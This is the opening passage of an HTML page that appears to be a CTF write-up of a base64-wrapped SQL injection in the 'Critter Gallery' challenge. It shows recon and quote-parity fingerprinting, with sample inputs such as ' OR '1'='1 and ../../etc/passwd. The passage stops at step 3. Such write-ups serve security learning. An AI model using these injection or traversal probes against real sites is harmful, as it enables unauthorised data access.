@@ -1,0 +1,1066 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Critter Gallery CTF — how I solved it · Intigriti Sept 2026</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@500;600;700&family=Inter:wght@400;500;600&family=JetBrains+Mono:wght@400;600;800&display=swap" rel="stylesheet">
+<style>
+  :root{
+    --bg0:#070a18; --bg:#0b0e22; --panel:#101432; --panel2:#181d44; --line:#272c63; --line2:#3a4190;
+    --text:#eef0ff; --muted:#a6abd9; --faint:#6d73ab;
+    --accent:#8b9dff; --accent2:#ff8bd0; --ok:#5eead4; --good:#6ee7a0; --err:#ff6b81; --warn:#ffd166;
+    --mono:'JetBrains Mono',ui-monospace,monospace; --disp:'Space Grotesk',sans-serif; --body:'Inter',sans-serif;
+  }
+  *{box-sizing:border-box} html{scroll-behavior:smooth}
+  body{margin:0;font-family:var(--body);color:var(--text);background:var(--bg0);overflow-x:hidden}
+  ::selection{background:rgba(139,157,255,.4)}
+  ::-webkit-scrollbar{width:10px}
+  ::-webkit-scrollbar-track{background:var(--bg0)}
+  ::-webkit-scrollbar-thumb{background:linear-gradient(180deg,var(--line2),#4a3a80);border-radius:8px;border:2px solid var(--bg0)}
+
+  #bg3d{position:fixed;inset:0;z-index:0;display:block}
+  .aurora{position:fixed;inset:0;z-index:0;overflow:hidden;pointer-events:none}
+  .aurora i{position:absolute;border-radius:50%;filter:blur(100px);opacity:.55}
+  .aurora i.a{width:58vw;height:46vh;left:-14vw;top:-18vh;background:radial-gradient(circle,#2a3570,transparent 70%);animation:drift 26s ease-in-out infinite alternate}
+  .aurora i.b{width:48vw;height:42vh;right:-12vw;top:-10vh;background:radial-gradient(circle,#43264f,transparent 70%);animation:drift 32s ease-in-out -8s infinite alternate-reverse}
+  .aurora i.c{width:44vw;height:38vh;left:24vw;bottom:-22vh;background:radial-gradient(circle,#1d2e66,transparent 70%);opacity:.45;animation:drift 38s ease-in-out -16s infinite alternate}
+  @keyframes drift{from{transform:translate(0,0) scale(1)}to{transform:translate(5vw,4vh) scale(1.15)}}
+  .gridlines{position:fixed;inset:0;z-index:0;pointer-events:none;opacity:.55;
+    background:linear-gradient(rgba(139,157,255,.05) 1px,transparent 1px) 0 0/100% 56px,
+               linear-gradient(90deg,rgba(139,157,255,.05) 1px,transparent 1px) 0 0/56px 100%;
+    mask-image:radial-gradient(ellipse 90% 70% at 50% 18%,#000 25%,transparent 75%)}
+  .vignette{position:fixed;inset:0;z-index:0;pointer-events:none;
+    background:radial-gradient(ellipse 120% 90% at 50% 40%,transparent 55%,rgba(4,6,16,.75) 100%)}
+
+  /* ---------- gradient-border helper ---------- */
+  .gcard{position:relative;border-radius:18px;background:linear-gradient(180deg,rgba(18,22,50,.92),rgba(11,14,34,.92))}
+  .gcard::before{content:"";position:absolute;inset:0;border-radius:inherit;padding:1px;
+    background:linear-gradient(135deg,rgba(139,157,255,.55),rgba(255,139,208,.3) 55%,rgba(110,231,160,.22));
+    -webkit-mask:linear-gradient(#000 0 0) content-box,linear-gradient(#000 0 0);
+    -webkit-mask-composite:xor;mask-composite:exclude;pointer-events:none}
+
+  #confetti{position:fixed;inset:0;z-index:70;pointer-events:none}
+  .wrap{position:relative;z-index:1}
+
+  /* ---------- progress + nav ---------- */
+  #progress{position:fixed;top:0;left:0;height:3px;width:0;z-index:50;
+    background:linear-gradient(90deg,var(--accent),var(--accent2),var(--warn));transition:width .1s linear}
+  nav{position:fixed;top:0;left:0;right:0;z-index:40;display:flex;align-items:center;gap:14px;
+    padding:12px 22px;background:rgba(7,10,24,.7);backdrop-filter:blur(16px);border-bottom:1px solid rgba(39,44,99,.55)}
+  nav .logo{font-family:var(--disp);font-weight:700;font-size:15px;letter-spacing:.4px;white-space:nowrap;display:flex;align-items:center;gap:8px}
+  nav .logo .paw{filter:drop-shadow(0 0 8px rgba(255,139,208,.9))}
+  nav .chips{display:flex;gap:6px;margin-left:auto;overflow-x:auto;scrollbar-width:none}
+  nav .chips::-webkit-scrollbar{display:none}
+  nav a.chip{font-family:var(--mono);font-size:10.5px;letter-spacing:.08em;text-decoration:none;color:var(--muted);
+    border:1px solid var(--line);padding:6px 11px;border-radius:99px;white-space:nowrap;transition:.2s}
+  nav a.chip:hover{color:var(--text);border-color:var(--accent)}
+  nav a.chip.on{color:#070a18;background:linear-gradient(92deg,var(--accent),var(--accent2));border-color:transparent;font-weight:600;
+    box-shadow:0 0 18px rgba(139,157,255,.45)}
+
+  /* ---------- hero ---------- */
+  .hero{min-height:94vh;display:flex;flex-direction:column;justify-content:center;padding:130px 7vw 60px;max-width:1200px;margin:0 auto}
+  .badge{display:inline-flex;align-items:center;gap:9px;width:fit-content;font-family:var(--mono);font-size:11px;letter-spacing:.22em;
+    color:var(--accent2);text-transform:uppercase;padding:8px 15px;border-radius:99px;margin-bottom:24px;
+    border:1px solid rgba(255,139,208,.35);background:rgba(255,139,208,.06)}
+  .badge .bd{width:7px;height:7px;border-radius:50%;background:var(--good);box-shadow:0 0 10px var(--good);animation:pulse 2s infinite}
+  @keyframes pulse{50%{opacity:.35}}
+  h1.big{font-family:var(--disp);font-size:clamp(38px,6.2vw,80px);line-height:1.02;margin:0 0 22px;letter-spacing:-.015em}
+  h1.big .glow{background:linear-gradient(92deg,var(--accent),var(--accent2),var(--warn),var(--accent));background-size:250% 100%;
+    -webkit-background-clip:text;background-clip:text;color:transparent;animation:slide 9s linear infinite}
+  @keyframes slide{to{background-position:250% 0}}
+  .hero p.sub{color:var(--muted);font-size:clamp(15px,1.6vw,18px);line-height:1.7;max-width:660px;margin:0 0 26px}
+  .hero p.sub b{color:var(--text)}
+  .meta{display:flex;flex-wrap:wrap;gap:8px;margin-bottom:30px}
+  .mchip{font-family:var(--mono);font-size:11.5px;color:var(--muted);border:1px solid var(--line);background:rgba(16,20,50,.66);
+    padding:7px 13px;border-radius:99px;display:inline-flex;gap:7px;align-items:center}
+  .mchip b{color:var(--text);font-weight:600}
+  .solvedby{display:inline-flex;align-items:center;gap:10px;padding:8px 15px 8px 10px;border-radius:99px;margin-bottom:34px;width:fit-content;
+    background:linear-gradient(180deg,rgba(24,29,68,.9),rgba(13,16,38,.9));border:1px solid var(--line2);transition:.25s;text-decoration:none}
+  .solvedby:hover{transform:translateY(-2px);border-color:var(--accent);box-shadow:0 8px 26px rgba(139,157,255,.25)}
+  .solvedby .gh{width:26px;height:26px;border-radius:50%;background:#eef0ff;display:grid;place-items:center}
+  .solvedby .gh svg{width:16px;height:16px;fill:#0b0e22}
+  .solvedby .st{font-family:var(--mono);font-size:11px;color:var(--faint);letter-spacing:.06em}
+  .solvedby .st b{display:block;color:var(--text);font-size:12.5px;letter-spacing:.02em}
+  .cta{display:flex;gap:14px;flex-wrap:wrap;align-items:center}
+  .btn{cursor:pointer;border:none;font-family:var(--disp);font-weight:600;font-size:15px;border-radius:14px;padding:14px 26px;
+    transition:.22s;text-decoration:none;display:inline-flex;align-items:center;gap:9px;position:relative;overflow:hidden}
+  .btn.primary{color:#070a18;background:linear-gradient(92deg,var(--accent),#b3c0ff);box-shadow:0 8px 32px rgba(139,157,255,.4)}
+  .btn.primary::after{content:"";position:absolute;top:0;left:-80%;width:50%;height:100%;
+    background:linear-gradient(100deg,transparent,rgba(255,255,255,.55),transparent);transform:skewX(-20deg);transition:.5s}
+  .btn.primary:hover::after{left:130%}
+  .btn.primary:hover{transform:translateY(-2px);box-shadow:0 12px 40px rgba(139,157,255,.55)}
+  .btn.ghost{color:var(--text);background:rgba(24,29,68,.55);border:1px solid var(--line)}
+  .btn.ghost:hover{border-color:var(--accent2);transform:translateY(-2px)}
+  .flagchip{font-family:var(--mono);font-size:13px;padding:13px 18px;border-radius:14px;cursor:pointer;user-select:none;transition:.25s;
+    color:var(--accent2);border:1px dashed rgba(255,139,208,.6);background:rgba(255,139,208,.06)}
+  .flagchip .fl{filter:blur(7px);transition:.4s;display:inline-block}
+  .flagchip.open .fl{filter:none;text-shadow:0 0 16px rgba(255,139,208,.6)}
+  .flagchip:hover{background:rgba(255,139,208,.12)}
+  .hero .hint{margin-top:30px;color:var(--faint);font-family:var(--mono);font-size:11.5px;display:flex;gap:24px;flex-wrap:wrap}
+  .hero .hint span{display:flex;gap:7px;align-items:center}
+
+  /* ---------- sections ---------- */
+  main{max-width:1060px;margin:0 auto;padding:0 6vw 40px}
+  .sec{padding:100px 0 26px;scroll-margin-top:70px;position:relative}
+  main::before{content:"";position:absolute;left:calc(6vw + 21px);top:120px;bottom:180px;width:2px;
+    background:linear-gradient(180deg,transparent,rgba(139,157,255,.3) 6%,rgba(255,139,208,.22) 94%,transparent)}
+  .sec-head{display:flex;gap:20px;align-items:flex-start;margin-bottom:6px;position:relative}
+  .num{font-family:var(--mono);font-weight:800;font-size:14px;color:#070a18;width:44px;height:44px;border-radius:14px;flex:none;
+    display:grid;place-items:center;background:linear-gradient(135deg,var(--accent),var(--accent2));
+    box-shadow:0 0 0 5px rgba(139,157,255,.12),0 8px 26px rgba(139,157,255,.4)}
+  .sec h2{font-family:var(--disp);font-size:clamp(24px,3.1vw,35px);margin:2px 0 4px;letter-spacing:-.01em}
+  .sec .kick{font-family:var(--mono);font-size:11px;letter-spacing:.24em;color:var(--faint);text-transform:uppercase}
+  .prose{color:var(--muted);line-height:1.75;font-size:15.5px;max-width:780px;margin:18px 0 0}
+  .prose strong,.prose b{color:var(--text)}
+  .prose code{font-family:var(--mono);font-size:.86em;background:rgba(139,157,255,.12);border:1px solid rgba(139,157,255,.22);
+    color:#c3d1ff;padding:2px 7px;border-radius:7px;word-break:break-all}
+  .take{margin:28px 0 0;padding:16px 19px;border-radius:14px;font-size:14.5px;color:var(--text);line-height:1.65;
+    background:linear-gradient(90deg,rgba(255,139,208,.09),rgba(255,139,208,.02) 70%);border:1px solid rgba(255,139,208,.25)}
+  .take .tk{font-family:var(--mono);font-size:10.5px;letter-spacing:.22em;color:var(--accent2);display:block;margin-bottom:6px}
+  .next{margin-top:46px;display:flex;justify-content:flex-end}
+
+  /* ---------- cards ---------- */
+  .cards{display:grid;grid-template-columns:repeat(auto-fit,minmax(240px,1fr));gap:14px;margin-top:28px}
+  .card{border-radius:16px;padding:19px;transition:.25s;background:linear-gradient(180deg,rgba(18,22,50,.85),rgba(11,14,34,.85));
+    border:1px solid var(--line)}
+  .card:hover{border-color:var(--line2);transform:translateY(-3px);box-shadow:0 14px 34px rgba(4,6,16,.5)}
+  .card .ci{font-size:22px;margin-bottom:10px}
+  .card h4{font-family:var(--disp);margin:0 0 6px;font-size:15px}
+  .card p{margin:0;color:var(--muted);font-size:13.5px;line-height:1.6}
+  .card p code{font-family:var(--mono);font-size:.9em;color:#c3d1ff}
+
+  /* ---------- playground / panels ---------- */
+  .play{margin-top:28px;overflow:hidden;backdrop-filter:blur(6px)}
+  .play-bar{display:flex;align-items:center;gap:8px;padding:12px 17px;border-bottom:1px solid var(--line);background:rgba(24,29,68,.35)}
+  .dot{width:10px;height:10px;border-radius:50%}
+  .dot.r{background:#ff5f57}.dot.y{background:#febc2e}.dot.g{background:#28c840}
+  .play-title{font-family:var(--mono);font-size:11px;letter-spacing:.18em;color:var(--faint);margin-left:8px}
+  .play-body{padding:19px;display:grid;gap:12px}
+  .field{display:grid;gap:6px}
+  .field label{font-family:var(--mono);font-size:10.5px;letter-spacing:.18em;color:var(--faint)}
+  .field input,.field textarea{font-family:var(--mono);font-size:13.5px;color:var(--text);background:#090c1f;border:1px solid var(--line);
+    border-radius:11px;padding:12px 14px;outline:none;transition:.2s;width:100%;resize:vertical}
+  .field input:focus,.field textarea:focus{border-color:var(--accent);box-shadow:0 0 0 3px rgba(139,157,255,.16)}
+  .b64mid{display:flex;align-items:center;gap:12px;font-family:var(--mono);color:var(--faint);font-size:11px}
+  .b64mid .arr{font-size:16px;color:var(--accent)}
+  .presets{display:flex;gap:8px;flex-wrap:wrap;align-items:center}
+  .pill{cursor:pointer;font-family:var(--mono);font-size:11.5px;color:var(--muted);background:rgba(24,29,68,.5);border:1px solid var(--line);
+    padding:7px 13px;border-radius:99px;transition:.2s;user-select:none}
+  .pill:hover{color:var(--text);border-color:var(--accent);transform:translateY(-1px)}
+  .pill.on{color:#070a18;background:linear-gradient(92deg,var(--accent),#b3c0ff);border-color:transparent;font-weight:600;
+    box-shadow:0 0 16px rgba(139,157,255,.4)}
+  .pill.danger.on{background:linear-gradient(92deg,var(--err),#ff9db0);color:#2a0510;box-shadow:0 0 16px rgba(255,107,129,.4)}
+  .pill.good.on{background:linear-gradient(92deg,var(--good),#a7f3d0);color:#052a14;box-shadow:0 0 16px rgba(110,231,160,.4)}
+  .pill.star.on{background:linear-gradient(92deg,var(--accent2),var(--warn));color:#2a0510;box-shadow:0 0 20px rgba(255,139,208,.5)}
+
+  /* ---------- request/response terminal ---------- */
+  .rr{margin-top:28px;display:grid;grid-template-columns:1fr 1fr;overflow:hidden;backdrop-filter:blur(6px);
+    box-shadow:0 24px 70px rgba(3,5,14,.6)}
+  .t-side{min-width:0;display:flex;flex-direction:column}
+  .t-side.req{border-right:1px solid var(--line)}
+  .t-bar{display:flex;align-items:center;gap:8px;padding:12px 15px;border-bottom:1px solid var(--line);background:rgba(24,29,68,.35)}
+  .t-title{font-family:var(--mono);font-size:11px;letter-spacing:.2em;color:var(--faint)}
+  .t-live{font-family:var(--mono);font-size:9.5px;letter-spacing:.14em;color:var(--warn);margin-left:auto;opacity:0;transition:.3s}
+  .t-live.blink{opacity:1;animation:blink 1s infinite}
+  @keyframes blink{50%{opacity:.25}}
+  .t-send{margin-left:auto;cursor:pointer;font-family:var(--mono);font-weight:600;font-size:11px;letter-spacing:.06em;color:#052a14;
+    background:linear-gradient(92deg,var(--good),#a7f3d0);border:none;border-radius:9px;padding:8px 15px;transition:.2s;white-space:nowrap}
+  .t-send:hover{transform:translateY(-1px);box-shadow:0 6px 20px rgba(110,231,160,.4)}
+  .t-send:disabled{opacity:.55;cursor:wait;transform:none;box-shadow:none}
+  .t-send.replay{background:linear-gradient(92deg,var(--accent),#b3c0ff);color:#070a18}
+  .t-body{padding:16px 17px;font-family:var(--mono);font-size:12.5px;line-height:1.75;overflow-x:auto;flex:1;min-height:230px}
+  .t-line{white-space:pre-wrap;word-break:break-all;opacity:0;transform:translateY(6px);transition:.35s}
+  .t-line.in{opacity:1;transform:none}
+  .t-line .k{color:var(--accent2);font-weight:600}
+  .t-line .dim{color:var(--faint)}
+  .t-line .hdr-k{color:var(--accent)}
+  .b64v{color:var(--warn)}
+  .t-dec{margin-top:11px;padding:11px 13px;background:rgba(255,209,102,.06);border:1px dashed rgba(255,209,102,.35);border-radius:10px;opacity:0;transition:.35s}
+  .t-dec.in{opacity:1}
+  .t-dec .dl{font-size:10px;letter-spacing:.16em;color:var(--warn);display:block;margin-bottom:5px}
+  .t-dec code{color:#ffe4a1;word-break:break-all}
+  .t-sql{margin-top:11px;padding:11px 13px;background:rgba(255,107,129,.07);border:1px solid rgba(255,107,129,.3);border-radius:10px;
+    opacity:0;transition:.35s;color:#ffc4cd;font-size:12px}
+  .t-sql.in{opacity:1}
+  .t-sql .sl{font-size:10px;letter-spacing:.16em;color:var(--err);display:block;margin-bottom:5px}
+  .t-sql .pay{color:#fff;font-weight:600}
+  .res-status{font-family:var(--mono);font-size:13px;opacity:0;transform:translateY(6px);transition:.35s}
+  .res-status.in{opacity:1;transform:none}
+  .res-status .st-ok{color:var(--good);font-weight:600;text-shadow:0 0 14px rgba(110,231,160,.5)}
+  .res-status .st-meta{color:var(--faint);font-size:11px}
+  .res-headers{margin-top:10px;display:grid;gap:3px}
+  .res-headers .t-line{font-size:11.5px}
+  .res-card{margin-top:15px;display:none;align-items:center;gap:15px;border-radius:14px;padding:15px 17px;opacity:0;
+    transform:scale(.95);transition:.4s;background:linear-gradient(135deg,rgba(24,29,68,.95),rgba(16,20,50,.95));border:1px solid var(--line2)}
+  .res-card.in{opacity:1;transform:none}
+  .res-card.show{display:flex}
+  .res-card .m-art{font-size:42px;filter:drop-shadow(0 4px 14px rgba(0,0,0,.5));width:68px;height:68px;display:grid;place-items:center;
+    background:radial-gradient(circle,rgba(139,157,255,.18),transparent 70%);border-radius:16px;flex:none}
+  .res-card .m-name{font-family:var(--disp);font-weight:600;font-size:15px;word-break:break-all}
+  .res-card .m-desc{color:var(--muted);font-size:12.5px;margin-top:3px;line-height:1.5;word-break:break-word}
+  .res-card .m-name.bad{color:var(--err)}
+  .res-card .m-name.win{color:var(--good)}
+  .res-raw{margin-top:15px;opacity:0;transition:.4s}
+  .res-raw.in{opacity:1}
+  .res-raw .rl{font-size:10px;letter-spacing:.16em;color:var(--faint);display:block;margin-bottom:6px}
+  .res-raw pre{margin:0;font-size:11.5px;line-height:1.65;background:#080b1c;border:1px solid var(--line);border-radius:11px;
+    padding:13px 15px;overflow-x:auto;color:#c6cdf5}
+  .res-raw mark{background:rgba(110,231,160,.2);color:var(--good);padding:1px 6px;border-radius:5px;font-weight:600;
+    text-shadow:0 0 12px rgba(110,231,160,.6);animation:mkpulse 1.6s ease 2}
+  @keyframes mkpulse{50%{background:rgba(110,231,160,.45)}}
+  .res-empty{margin-top:15px;display:none;padding:17px;border:1px dashed rgba(255,107,129,.5);border-radius:11px;color:var(--err);
+    font-size:12px;opacity:0;transition:.4s;background:rgba(255,107,129,.05)}
+  .res-empty.in{opacity:1;display:block}
+  .res-note{margin-top:15px;padding:13px 15px;background:rgba(139,157,255,.08);border:1px solid rgba(139,157,255,.25);border-radius:11px;
+    font-family:var(--body);font-size:13px;line-height:1.6;color:var(--text);opacity:0;transform:translateY(8px);transition:.4s}
+  .res-note.in{opacity:1;transform:none}
+  .res-note .nk{font-family:var(--mono);font-size:10px;letter-spacing:.2em;color:var(--accent);display:block;margin-bottom:5px}
+  .res-note code{font-family:var(--mono);font-size:.9em;color:#c3d1ff}
+  .rr-hint{grid-column:1/-1;font-family:var(--mono);font-size:10.5px;color:var(--faint);letter-spacing:.1em;
+    padding:10px 17px;border-top:1px solid var(--line);background:rgba(24,29,68,.25)}
+  .t-tools{display:flex;gap:8px;flex-wrap:wrap;padding:13px 17px;border-top:1px solid var(--line);background:rgba(24,29,68,.2)}
+
+  /* ---------- parity table ---------- */
+  .parity{margin-top:28px;overflow:hidden}
+  .prow{display:grid;grid-template-columns:1fr 130px 1fr;gap:12px;align-items:center;padding:14px 19px;border-bottom:1px solid var(--line);
+    font-size:13.5px}
+  .prow:last-child{border-bottom:none}
+  .prow.head{background:rgba(24,29,68,.5);font-family:var(--mono);font-size:10px;letter-spacing:.2em;color:var(--faint);text-transform:uppercase}
+  .prow .pl{font-family:var(--mono);font-size:12.5px;color:var(--warn);word-break:break-all}
+  .prow .ok{color:var(--good);font-weight:600}.prow .bad{color:var(--err);font-weight:600}
+  .prow .why{color:var(--muted);font-size:12.5px}
+
+  /* ---------- code compare ---------- */
+  .code2{display:grid;grid-template-columns:1fr 1fr;gap:15px;margin-top:28px}
+  .codebox{overflow:hidden;background:linear-gradient(180deg,rgba(10,13,30,.95),rgba(7,10,24,.95))}
+  .cb-bar{font-family:var(--mono);font-size:10.5px;letter-spacing:.18em;padding:11px 16px;border-bottom:1px solid var(--line)}
+  .vuln .cb-bar{color:var(--err);background:rgba(255,107,129,.08)}
+  .fixed .cb-bar{color:var(--good);background:rgba(110,231,160,.08)}
+  .codebox pre{margin:0;padding:17px;font-family:var(--mono);font-size:12px;line-height:1.7;color:#c6cdf5;overflow-x:auto}
+  .codebox .cm{color:var(--faint)}
+  .codebox .bad-line{background:rgba(255,107,129,.14);display:inline-block;width:100%;border-radius:4px}
+  .codebox .good-line{background:rgba(110,231,160,.12);display:inline-block;width:100%;border-radius:4px}
+  .codebox .str{color:#ffd9a1}
+  .oneliner{margin-top:16px;padding:15px 17px;background:#080b1c;border:1px solid var(--line);border-radius:13px;overflow-x:auto}
+  .oneliner code{font-family:var(--mono);font-size:11.5px;color:#9fe8c0;white-space:pre}
+
+  /* ---------- flag modal ---------- */
+  .modal{position:fixed;inset:0;z-index:60;display:none;place-items:center;background:rgba(4,6,16,.72);backdrop-filter:blur(12px)}
+  .modal.open{display:grid}
+  .modal .box{position:relative;max-width:640px;width:calc(100% - 40px);border-radius:24px;padding:40px 34px;text-align:center;
+    background:linear-gradient(160deg,rgba(26,31,72,.97),rgba(13,16,40,.97));box-shadow:0 34px 100px rgba(0,0,0,.65);
+    animation:pop .45s cubic-bezier(.2,1.4,.4,1)}
+  @keyframes pop{from{transform:scale(.8);opacity:0}}
+  .modal .fk{font-family:var(--mono);font-size:11px;letter-spacing:.3em;color:var(--accent2)}
+  .modal h3{font-family:var(--disp);font-size:31px;margin:10px 0 6px}
+  .modal .fp{font-family:var(--mono);font-size:clamp(14px,2.6vw,19px);font-weight:600;color:var(--good);background:rgba(110,231,160,.08);
+    border:1px solid rgba(110,231,160,.4);border-radius:13px;padding:17px 18px;margin:20px 0;word-break:break-all;
+    text-shadow:0 0 20px rgba(110,231,160,.55)}
+  .modal .row{display:flex;gap:10px;justify-content:center;flex-wrap:wrap}
+  .modal .x{position:absolute;top:14px;right:16px;cursor:pointer;color:var(--faint);font-size:20px;background:none;border:none}
+  .modal .x:hover{color:var(--text)}
+
+  /* ---------- footer ---------- */
+  footer{position:relative;z-index:1;text-align:center;color:var(--faint);font-family:var(--mono);font-size:11.5px;line-height:2.1;
+    padding:52px 20px 48px;border-top:1px solid rgba(39,44,99,.45);margin-top:60px;background:rgba(7,10,24,.65)}
+  footer a{color:var(--accent);text-decoration:none}
+  footer a:hover{text-decoration:underline}
+  footer .big{font-family:var(--disp);font-size:14px;color:var(--muted);letter-spacing:.04em;margin-bottom:8px}
+
+  /* ---------- reveal / toast ---------- */
+  .reveal{opacity:0;transform:translateY(26px);transition:opacity .7s ease,transform .7s ease}
+  .reveal.in{opacity:1;transform:none}
+  #toast{position:fixed;bottom:26px;left:50%;transform:translate(-50%,80px);z-index:80;background:var(--panel2);color:var(--text);
+    border:1px solid var(--accent);padding:11px 20px;border-radius:12px;font-family:var(--mono);font-size:12.5px;transition:.35s;opacity:0}
+  #toast.show{transform:translate(-50%,0);opacity:1}
+
+  @media (max-width:860px){
+    .rr{grid-template-columns:1fr}
+    .t-side.req{border-right:none;border-bottom:1px solid var(--line)}
+    .code2{grid-template-columns:1fr}
+    .prow{grid-template-columns:1fr;gap:6px}
+    .prow.head{display:none}
+    nav .chips{max-width:50vw}
+    .hero{padding-top:104px}
+    main::before{display:none}
+  }
+  @media (prefers-reduced-motion:reduce){
+    *{animation:none!important;transition:none!important}
+    html{scroll-behavior:auto}
+    .reveal{opacity:1;transform:none}
+  }
+</style>
+</head>
+<body>
+<canvas id="bg3d"></canvas>
+<canvas id="confetti"></canvas>
+<div class="aurora" aria-hidden="true"><i class="a"></i><i class="b"></i><i class="c"></i></div>
+<div class="gridlines" aria-hidden="true"></div>
+<div class="vignette" aria-hidden="true"></div>
+<div id="progress"></div>
+<div id="toast"></div>
+
+<nav>
+  <div class="logo"><span class="paw">🐾</span> CRITTER GALLERY <span style="color:var(--accent2)">CTF</span></div>
+  <div class="chips">
+    <a class="chip" href="#s1">01 RECON</a>
+    <a class="chip" href="#s2">02 QUOTES</a>
+    <a class="chip" href="#s3">03 CONFIRM</a>
+    <a class="chip" href="#s4">04 UNION</a>
+    <a class="chip" href="#s5">05 ENUMERATE</a>
+    <a class="chip" href="#s6">06 FLAG</a>
+    <a class="chip" href="#s7">07 THE FIX</a>
+  </div>
+</nav>
+
+<div class="wrap">
+
+<!-- ================= HERO ================= -->
+<header class="hero">
+  <div class="badge"><span class="bd"></span> Intigriti monthly challenge · Sept 2026 · solved</div>
+  <h1 class="big">Breaking the<br><span class="glow">Critter Gallery</span></h1>
+  <p class="sub">This is my solution to the September 2026 Intigriti CTF. The whole challenge was
+     <b>one SQL injection</b> hidden behind base64 encoding. Scroll through the steps below —
+     every request shown is a <b>real one I sent</b>, with the real response the server gave back.</p>
+  <div class="meta">
+    <span class="mchip">🎯 <b>Union SQLi</b></span>
+    <span class="mchip">🐘 PHP <b>8.2.33</b></span>
+    <span class="mchip">🗄️ MySQL <b>8.0.46</b></span>
+    <span class="mchip">🧩 <b>web CTF</b></span>
+    <span class="mchip">🎨 challenge by <b>@khanhdlq</b></span>
+  </div>
+  <a class="solvedby" href="https://github.com/RYD3R-0" target="_blank" rel="noopener">
+    <span class="gh"><svg viewBox="0 0 24 24"><path d="M12 .5C5.65.5.5 5.65.5 12c0 5.08 3.29 9.39 7.86 10.91.58.1.79-.25.79-.55v-2.17c-3.2.7-3.87-1.36-3.87-1.36-.53-1.33-1.28-1.69-1.28-1.69-1.05-.72.08-.7.08-.7 1.16.08 1.77 1.19 1.77 1.19 1.03 1.77 2.7 1.26 3.36.96.1-.75.4-1.26.73-1.55-2.55-.29-5.23-1.28-5.23-5.68 0-1.26.45-2.28 1.19-3.09-.12-.29-.52-1.46.11-3.05 0 0 .97-.31 3.18 1.18a11 11 0 0 1 5.8 0c2.2-1.49 3.17-1.18 3.17-1.18.63 1.59.23 2.76.11 3.05.74.81 1.19 1.83 1.19 3.09 0 4.41-2.69 5.38-5.25 5.66.41.36.78 1.05.78 2.13v3.16c0 .3.2.66.8.55A11.5 11.5 0 0 0 23.5 12C23.5 5.65 18.35.5 12 .5z"/></svg></span>
+    <span class="st">solved &amp; written by<b>RYD3R-0 · github.com/RYD3R-0</b></span>
+  </a>
+  <div class="cta">
+    <a class="btn primary" href="#s1">Start with step 1 →</a>
+    <button class="flagchip" id="heroFlag">🚩 the flag&nbsp;→&nbsp;<span class="fl">INTIGRITI{01a09f56-74a2-700b-a849-ffe6742327b2}</span></button>
+  </div>
+  <div class="hint">
+    <span>🖱️ drag the background to spin the 3D scene</span>
+    <span>▶ press SEND in any terminal to replay a request</span>
+  </div>
+</header>
+
+<main>
+
+<!-- ================= STEP 1 ================= -->
+<section class="sec" id="s1">
+  <div class="sec-head reveal">
+    <div class="num">01</div>
+    <div><div class="kick">Recon</div><h2>A gallery that speaks base64</h2></div>
+  </div>
+  <p class="prose reveal">The target is <code>/challenge.php</code> — a small animal gallery with eight critters and no forms
+    anywhere. Every tile links to itself with one parameter: <code>?pic=Zm94</code>. Decode <code>Zm94</code> and you get
+    <code>fox</code>. So the server takes my value, base64-decodes it, and does something with it. That "something" is
+    the whole challenge.</p>
+  <p class="prose reveal">Worth remembering: <b>base64 is encoding, not protection</b>. It hides the value from a casual
+    glance, nothing more. Try it:</p>
+
+  <div class="play gcard reveal">
+    <div class="play-bar"><span class="dot r"></span><span class="dot y"></span><span class="dot g"></span>
+      <span class="play-title">BASE64 — type anything</span></div>
+    <div class="play-body">
+      <div class="field"><label>PLAINTEXT</label><input id="b64in" value="fox" spellcheck="false"></div>
+      <div class="b64mid"><span class="arr">↓</span> btoa() <span style="flex:1;height:1px;background:var(--line)"></span></div>
+      <div class="field"><label>BASE64</label><input id="b64out" spellcheck="false"></div>
+      <div class="presets">
+        <span style="font-family:var(--mono);font-size:10.5px;color:var(--faint)">try:</span>
+        <button class="pill" data-b64="fox">fox</button>
+        <button class="pill" data-b64="panda">panda</button>
+        <button class="pill" data-b64="../../etc/passwd">../../etc/passwd</button>
+        <button class="pill" data-b64="' OR '1'='1">' OR '1'='1</button>
+      </div>
+    </div>
+  </div>
+
+  <p class="prose reveal">Sending the real value <code>fox</code> renders a detail card — emoji, name, description.
+    So some server-side code looked that name up.</p>
+  <div id="t1" class="reveal"></div>
+
+  <div class="take reveal"><span class="tk">what this step proved</span>
+    The only attack surface is one decoded string, and the description on the page comes from a server-side lookup.</div>
+  <div class="next reveal"><a class="btn ghost" href="#s2">Step 02 — poking the quotes →</a></div>
+</section>
+
+<!-- ================= STEP 2 ================= -->
+<section class="sec" id="s2">
+  <div class="sec-head reveal">
+    <div class="num">02</div>
+    <div><div class="kick">Error fingerprinting</div><h2>One quote kills the page</h2></div>
+  </div>
+  <p class="prose reveal">First I checked the reflection: send <code>&lt;h1&gt;test&lt;/h1&gt;</code> as the name and the page
+    prints it back <b>encoded</b> — so no XSS there. But the value has to go somewhere. Next move: add a quote and see who
+    complains.</p>
+  <p class="prose reveal">The result was clean: <code>fox'</code> → the page comes back <b>completely empty</b>.
+    <code>fox''</code> → normal page. Odd quotes break it, even quotes survive. That's a SQL error with
+    <code>display_errors</code> turned off — my input is landing inside a SQL string.</p>
+
+  <div class="parity gcard reveal">
+    <div class="prow head"><span>value sent (decoded)</span><span>response</span><span>meaning</span></div>
+    <div class="prow"><span class="pl">fox'</span><span class="bad">200 · 0 bytes</span><span class="why">odd quotes → broken SQL → PHP fatal</span></div>
+    <div class="prow"><span class="pl">fox''</span><span class="ok">200 · full page</span><span class="why">balanced quotes → valid literal</span></div>
+    <div class="prow"><span class="pl">fox'''</span><span class="bad">200 · 0 bytes</span><span class="why">odd again → dead</span></div>
+    <div class="prow"><span class="pl">fox"</span><span class="ok">200 · full page</span><span class="why">double quote ignored → single-quote context</span></div>
+  </div>
+
+  <div id="t2" class="reveal"></div>
+
+  <div class="take reveal"><span class="tk">what this step proved</span>
+    A blank page is still an answer. Quote parity is the quickest way to prove input is spliced into a query — no error text needed.</div>
+  <div class="next reveal"><a class="btn ghost" href="#s3">Step 03 — proving it →</a></div>
+</section>
+
+<!-- ================= STEP 3 ================= -->
+<section class="sec" id="s3">
+  <div class="sec-head reveal">
+    <div class="num">03</div>
+    <div><div class="kick">Confirmation</div><h2>Asking for x, getting the fox</h2></div>
+  </div>
